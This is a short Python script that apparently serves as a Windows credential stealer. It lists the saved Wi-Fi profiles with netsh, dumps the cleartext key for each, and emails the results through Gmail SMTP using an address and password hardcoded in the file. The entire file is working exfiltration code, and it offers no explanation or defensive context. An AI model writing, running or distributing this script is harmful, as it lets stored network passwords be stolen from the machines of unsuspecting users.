#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email, password,)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profiles"
networks = subprocess.check_output(command, shell=True).decode('utf-8')
names_list = re.findall('(?:Profile\s*:\s)(.*)', networks)
result = ""
for name in names_list:
    try:
        command = "netsh wlan show profile " + '"' + name + '"' + " key=clear "
        current_result = subprocess.check_output(command, shell=True).decode('utf-8')
    except subprocess.CalledProcessError :
        current_result = "error"
        #print("Error occurred with %s ", name)
    result = result + current_result

send_mail("meherpranav5@gmail.com", "dontaskagain", result)








